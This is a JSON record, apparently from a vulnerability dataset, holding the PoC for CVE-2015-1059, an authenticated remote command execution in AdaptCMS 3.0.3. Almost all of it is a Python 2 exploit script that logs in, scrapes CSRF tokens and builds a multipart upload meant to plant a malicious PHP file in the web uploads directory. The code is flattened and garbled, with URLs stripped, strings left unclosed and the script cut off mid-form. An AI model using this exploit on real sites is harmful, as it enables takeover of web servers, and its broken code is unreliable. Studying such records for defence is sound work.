{
    "text": "vul_name : AdaptCMS 3.0.3 Remote Command Execution ， vul_cve : CVE-2015-1059 ， vul_poc :  #  ! /usr/bin/env python ，  # AdaptCMS 3.0.3 Remote Command Execution Exploit ，  # Vendor : Insane Visions ，  # Product web page :  ，  # Affected version : 3.0.3 ，  # Summary : AdaptCMS is a Content Management System trying ，  # to be both simple and easy to use , as well as very agile ，  # and extendable. Not only so we can easily create Plugins ，  # or additions , but so other developers can get involved. ，  # Using CakePHP we are able to achieve this with a built-in ，  # plugin system and MVC setup , allowing us to focus on the ，  # details and end-users to focus on building their website ，  # to look and feel great. ，  # Desc : AdaptCMS suffers from an authenticated arbitrary ，  # command execution vulnerability. The issue is caused due ，  # to the improper verification of uploaded files. This can ，  # be exploited to execute arbitrary PHP code by creating ，  # or uploading a malicious PHP script file that will be ，  # stored in '\\app\\webroot\\uploads' directory. ，  # Tested on : Apache 2.4.10 ( Win32 )  ，  # PHP 5.6.3 ，  # MySQL 5.6.21 ，  # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic ，  #  @ zeroscience ，  # Advisory ID : ZSL-2015-5220 ，  # Advisory URL :  ，  # 29.12.2014 ， from cStringIO import StringIO ， from urllib2 import URLError ， piton = os.path.basename ( sys.argv [ 0 ]  )  ， print \" ， o=o ，  | AdaptCMS RCE Exploit |  ，  | ID : ZSL-2015-5220 |  ，  | o/ |  ， +-+ ， \" ， print '\\x20\\x20 [  *  ] Usage : '+piton+' <hostname> <pathname>' ， print '\\x20\\x20 [  *  ] Example : '+piton+' zeroscience.mk adaptcms\\n' ， sys.exit (  )  ， bannerche (  )  ， host = sys.argv [ 1 ]  ， path = sys.argv [ 2 ]  ， cj = cookielib.CookieJar (  )  ， opener = urllib2.build_opener ( urllib2.HTTPCookieProcessor ( cj )  ， gettokens = opener.open ( ' ， print 'Path error.' ， sys.exit (  )  ， print 'Hostname error.' ， sys.exit (  )  ， print '\\x20\\x20 [  *  ] Login please.' ， tokenfields = re.search ( 'fields ] \" value=\" ( .+? ) \" id=' , gettokens.read (  ) .group ( 1 )  ， gettokens = opener.open ( ' ， tokenkey = re.search ( 'key ] \" value=\" ( .+? ) \" id=' , gettokens.read (  ) .group ( 1 )  ， username = raw_input ( '\\x20\\x20 [  *  ] Enter username : ' )  ， password = raw_input ( '\\x20\\x20 [  *  ] Enter password : ' )  ， login_data = urllib.urlencode ( { ， '_method' : 'POST' ,  ， 'data [ User ]  [ username ] ' : username ,  ， 'data [ User ]  [ password ] ' : password ,  ， 'data [ _Token ]  [ fields ] ' : '864206fbf949830ca94401a65660278ae7d065b3%3A' ,  ， 'data [ _Token ]  [ key ] ' : tokenkey ,  ， 'data [ _Token ]  [ unlocked ] ' : ' ， } )  ， login = opener.open ( ' login_data )  ， auth = login.read (  )  ， sessid = session.name ， ses_chk = re.search ( r'%s=\\w+' % sessid , str ( cj )  ， cookie = ses_chk.group ( 0 )  ， print '\\x20\\x20 [  *  ] Accessing.' ， upload = opener.open ( ' ， filetoken = re.search ( 'key ] \" value=\" ( .+? ) \" id=' , upload.read (  ) .group ( 1 )  ， class MultiPartForm ( object )  :  ， self.form_fields = [  ]  ， self.files = [  ]  ， self.boundary = mimetools.choose_boundary (  )  ， self.form_fields.append ( name , value )  ， body = fileHandle.read (  )  ， mimetype = mimetypes.guess_type ( filename )  [ 0 ] or 'application/octet-stream' ， self.files.append ( fieldname , filename , mimetype , body )  ， parts = [  ]  ， part_boundary = '-' + self.boundary ， parts.extend (  ，  [ part_boundary ,  ， 'Content-Disposition : form-data ; name=\"%s\"' % name ,  ， ' ,  ， value ,  ，  ]  ， parts.extend (  ，  [ part_boundary ,  ， 'Content-Disposition : file ; name=\"%s\" ; filename=\"%s\"' % \\ ，  ( field_name , filename )  ,  ， 'Content-Type : %s' % content_type ,  ， ' ,  ， body ,  ，  ]  ， flattened = list ( itertools.chain (  * parts )  ， flattened.append ( '-' + self.boundary + '-' )  ， flattened.append ( ' )  ， form = MultiPartForm (  )  ， form.add_field ( '_method' , 'POST' )  ， form.add_field ( 'data [ _Token ]  [ key ] ' , filetoken )  ， form.add_field ( 'data [ File ]  [ type ] ' , 'edit' )  ， form.add_field ( 'data [ 0 ]  [ File ]  [ filename ] ' , ' )  ， form.add_field ( 'data [ 0 ]  [ File ]  [ dir ] ' , 'uploads/' )  ， form.add_field ( 'data [ 0 ]  [ File ]  [ mimetype ] ' , ' )  ， form.add_field ( 'data [ 0 ]  [ File ]  [ filesize ] ' , ' ) ",
    "time": "2015-01-06 / 2015-04-12"
}